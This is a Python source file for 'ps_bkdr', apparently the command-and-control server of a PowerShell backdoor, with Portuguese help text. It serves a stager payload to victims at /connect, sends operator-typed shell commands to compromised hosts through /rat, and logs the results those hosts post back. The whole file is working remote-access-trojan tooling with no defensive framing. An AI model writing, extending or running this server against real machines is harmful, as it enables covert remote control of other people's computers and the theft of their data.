from payload.basic_shell import BasicShell
from http.server import HTTPServer, BaseHTTPRequestHandler
import argparse
import base64
import logging

stage_activated = None
logging.basicConfig(level=logging.INFO)

class MyHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        return

    def do_GET(self):
        global stage_activated
        if self.path == '/connect':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(stage_activated.get_code().encode())

        elif self.path == "/rat":
            self.send_response(200)
            cmd = base64.b64decode(input("(ps_bkdr) > ").encode('latin-1'))
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(cmd)

    def do_POST(self):
        if self.path == "/rat":
            content_len = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_len).decode('latin-1')
            logging.info("[POST RECEIVED] %s", post_data)
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()


def main():
    global stage_activated

    parser = argparse.ArgumentParser(description="ps_bkdr")
    parser.add_argument('-i', '--ip-addr', dest='ip', default='0.0.0.0', help='IP do servidor')
    parser.add_argument('-p', '--port', dest='port', default=8000, type=int, help='Porta do servidor')
    parser.add_argument('-s', '--stage', dest='stage', default='basic', help='Nome do stage')
    parser = argparse.ArgumentParser(
    description="ps_bkdr - Servidor de payloads para execução remota via PowerShell",
    epilog="Exemplo de uso:\n  python ps_bkdr.py -i 127.0.0.1 -p 8080 -s basic",
    formatter_class=argparse.RawTextHelpFormatter
)

    parser.add_argument(
        '-i', '--ip-addr',
        dest='ip',
        default='0.0.0.0',
        help='IP do servidor'
    )
    parser.add_argument(
        '-p', '--port',
        dest='port',
        type=int,
        default=8000,
        help='Porta do servidor'
    )
    parser.add_argument(
        '-s', '--stage',
        dest='stage',
        default='basic',
        help='Nome do stage a ser carregado'
    )

    args = parser.parse_args()

    print('[*] Iniciando o servidor...')
    print(f'[*] HOST: {args.ip}:{args.port}')

    stagers = {
        BasicShell.get_name().lower(): BasicShell()
    }

    stage_activated = stagers.get(args.stage)

    if not stage_activated:
        exit(f'[!] Stage "{args.stage}" não encontrado.')

    try:
        stage_activated.set_handler(args.ip, args.port)
        server = HTTPServer((args.ip, args.port), MyHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        print('[*] Servidor encerrado')
        server.server_close()


if __name__ == '__main__':
    main()
